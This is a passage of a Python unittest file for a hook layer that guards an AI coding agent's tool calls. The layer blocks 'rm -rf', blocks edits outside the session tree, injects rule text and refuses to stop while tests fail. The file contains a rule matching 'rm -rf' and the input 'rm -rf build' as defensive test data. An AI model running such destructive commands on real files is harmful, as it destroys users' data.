                                 "tools": {"shell": ["terminal"], "edit": ["patch_file"]}},
                       "transcripts": {"dir": ".otter/logs", "file": "{session}.jsonl"}}}

    def setUp(self):
        self.d = tempfile.mkdtemp()
        self.home = os.path.join(self.d, "home")
        os.makedirs(self.home)
        m, errors = toolpacks.validate(self.OTTER)
        self.assertEqual(errors, [])
        rec = {"name": "otter", "url": "https://example.com/otter", "commit": "a" * 40, "manifest": m, "tier": "vetted"}
        packs = os.path.join(self.d, "toolpacks.json")
        Path(packs).write_text(json.dumps({"toolchains": [toolpacks.recipe(rec)]}))
        env = mock.patch.dict(os.environ, {"BB_TOOLPACKS_JSON": packs, "HOME": self.home, "BB_TREE": "/w/p",
                                           "BB_PROJECT": "alpha", "BB_AGENT_WHO": "u_0123abcd"})
        env.start()
        self.addCleanup(env.stop)
        self.h = load_hook()
        stub = os.path.join(self.d, "hook")
        Path(stub).write_text("#!/usr/bin/env python3\nimport json, os, sys\nd = json.load(sys.stdin)\n"
                              "if sys.argv[1:2] == ['guard'] and 'rm -rf' in (d.get('tool_input') or {}).get('command', ''):\n"
                              "    print('a rule refuses rm -rf here', file=sys.stderr); sys.exit(2)\n"
                              "if sys.argv[1:2] == ['prompt']:\n"
                              "    print(json.dumps({'hookSpecificOutput': {'additionalContext': 'RULE TEXT'}}))\n"
                              "if os.path.basename(sys.argv[0]) == 'bb-check-relay' and not d.get('stop_hook_active'):\n"
                              "    print('the tests fail: fix them', file=sys.stderr); sys.exit(2)\n")
        os.chmod(stub, 0o755)
        hooks = os.path.join(self.d, "hooks")
        os.mkdir(hooks)
        for spec in self.h.HOOKS.values():
            for script, *_ in spec["steps"]:
                if not os.path.exists(os.path.join(hooks, script)):
                    os.symlink(stub, os.path.join(hooks, script))
        self.h.HERE = hooks

    def call(self, event, payload):
        import io
        out = io.StringIO()
        with mock.patch("sys.stdin", io.StringIO(json.dumps(payload))), mock.patch("sys.stdout", out), \
                mock.patch.object(self.h, "settle", lambda *a: None):
            self.assertEqual(self.h.main(["otter", event]), 0)
        return json.loads(out.getvalue())

    def test_its_hooks_file_is_laid_out_as_it_says_and_the_rest_of_the_file_kept(self):
        path = os.path.join(self.home, ".otter", "settings.json")
        os.makedirs(os.path.dirname(path))
        Path(path).write_text(json.dumps({"theme": "dark", "agent": {"model": "o1", "hooks": {"old": 1}}}))
        self.h.pack_hooks("otter", self.home, "/b/h otter")
        doc = json.loads(Path(path).read_text())
        self.assertEqual((doc["theme"], doc["schema"], doc["agent"]["model"]), ("dark", 3, "o1"))
        self.assertEqual(doc["agent"]["hooks"], {"before_tool": {"do": [{"run": "/b/h otter pre", "limit": 120}]},
                                                 "on_message": {"do": [{"run": "/b/h otter prompt", "limit": 900}]},
                                                 "on_done": {"do": [{"run": "/b/h otter stop", "limit": 3600}]}})

    def test_it_is_held_and_answered_in_its_own_words(self):
        ctx = {"id": "s-1", "dir": "/w/p"}
        self.assertEqual(self.call("pre", {"ctx": ctx, "call": {"tool": "terminal", "params": {"script": "rm -rf build"}}}),
                         {"ok": False, "why": "a rule refuses rm -rf here"})
        self.assertEqual(self.call("pre", {"ctx": ctx, "call": {"tool": "terminal", "params": {"script": "ls"}}}), {"ok": True})
        with mock.patch.dict(os.environ, {"WORKSPACE": "/w"}):
            got = self.call("pre", {"ctx": ctx, "call": {"tool": "patch_file", "params": {"target": "/w/other/a.py"}}})
        self.assertEqual(got["ok"], False)
        self.assertIn("outside this session's tree", got["why"])
        self.assertEqual(self.call("prompt", {"ctx": ctx, "message": "hello"}), {"context": "RULE TEXT"})
        self.assertEqual(self.call("stop", {"ctx": ctx}), {"again": True, "because": "the tests fail: fix them"})
        self.assertEqual(self.call("stop", {"ctx": ctx, "again": True}), {}, "its payload says a stop was refused already, and it gives no pass: {}")
        Path(self.home, ".otter", "logs").mkdir(parents=True)
        Path(self.home, ".otter", "logs", "s-1.jsonl").write_text("{}\n")
        self.call("stop", {"ctx": ctx, "again": True})
        self.assertTrue(Path(self.home, ".claude", "projects", "-w-p", "otter", "s-1.jsonl").exists(), "its conversation kept by the id its path names")


if __name__ == "__main__":
    unittest.main()
